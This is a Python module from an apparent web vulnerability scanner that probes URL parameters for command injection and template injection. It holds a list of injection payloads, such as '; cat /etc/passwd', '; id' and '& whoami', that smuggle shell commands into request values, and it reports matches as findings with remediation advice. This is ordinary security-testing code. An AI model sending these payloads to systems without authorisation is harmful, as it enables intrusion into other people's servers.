"""AmonStrike — Command Injection / RCE Module"""
import re
from urllib.parse import parse_qs, urlparse
from .base import BaseModule

class RceModule(BaseModule):
    NAME = "rce"
    DESCRIPTION = "Command injection and Remote Code Execution detection"

    PAYLOADS = [
        ("; id", ["uid=", "gid="]),
        ("| id", ["uid=", "gid="]),
        ("& id", ["uid=", "gid="]),
        ("`id`", ["uid=", "gid="]),
        ("$(id)", ["uid=", "gid="]),
        ("; cat /etc/passwd", ["root:x:"]),
        ("| cat /etc/passwd", ["root:x:"]),
        ("; whoami", ["root", "www-data", "apache", "nginx"]),
        ("&& whoami", ["root", "www-data", "apache"]),
        # Windows
        ("& whoami", ["SYSTEM", "Administrator", "NT AUTHORITY"]),
        ("| dir", ["Volume in drive", "Directory of"]),
        # PHP specific
        (";phpinfo();", ["PHP Version", "System"]),
        # SSTI
        ("{{7*7}}", ["49"]),
        ("${7*7}", ["49"]),
        ("<%= 7 * 7 %>", ["49"]),
        ("#{7*7}", ["49"]),
    ]

    def run(self):
        self.log("Testing for command injection / RCE...")
        parsed = urlparse(self.url)
        params = parse_qs(parsed.query)

        all_params = {k: v[0] for k, v in params.items()}
        if not all_params:
            all_params = {"cmd": "test", "exec": "test", "command": "test", "ping": "127.0.0.1", "host": "localhost"}

        for param, orig in all_params.items():
            for payload, indicators in self.PAYLOADS:
                resp = self.get(params={param: orig + payload})
                if resp and any(ind in resp.text for ind in indicators):
                    matched = [ind for ind in indicators if ind in resp.text]
                    self.add_finding(
                        title=f"Remote Code Execution / Command Injection — {param}",
                        severity="CRITICAL",
                        description=f"Command injection or RCE in parameter '{param}'. Attacker can execute arbitrary system commands.",
                        evidence=f"Parameter: {param}\nPayload: {payload}\nResponse contains: {matched}",
                        remediation="Never pass user input to system commands. Use language APIs instead of shell commands. Whitelist allowed inputs. Run application with minimal privileges.",
                        url=resp.url,
                        cve="CWE-78"
                    )
                    break

        # Check for SSTI separately
        self._check_ssti()
        self.log(f"RCE scan complete — {len(self.findings)} findings", "+")
        return self.result()

    def _check_ssti(self):
        """Server-Side Template Injection."""
        ssti_payloads = [
            ("{{7*7}}", "49"),
            ("${7*7}", "49"),
            ("<%= 7*7 %>", "49"),
            ("#{7*7}", "49"),
            ("*{7*7}", "49"),
        ]
        parsed = urlparse(self.url)
        params = parse_qs(parsed.query)
        test_params = {k: v[0] for k, v in params.items()} or {"name": "test", "q": "test"}

        for param in list(test_params.keys())[:3]:
            for payload, expected in ssti_payloads:
                resp = self.get(params={param: payload})
                if resp and expected in resp.text:
                    self.add_finding(
                        title=f"Server-Side Template Injection (SSTI) — {param}",
                        severity="CRITICAL",
                        description=f"SSTI in parameter '{param}'. Template engine evaluates user input, enabling RCE.",
                        evidence=f"Payload: {payload}\nExpected: {expected}\nFound in response: YES",
                        remediation="Never pass user input to template engines. Use sandboxed template rendering. Escape all user input.",
                        url=resp.url,
                        cve="CWE-94"
                    )
                    return
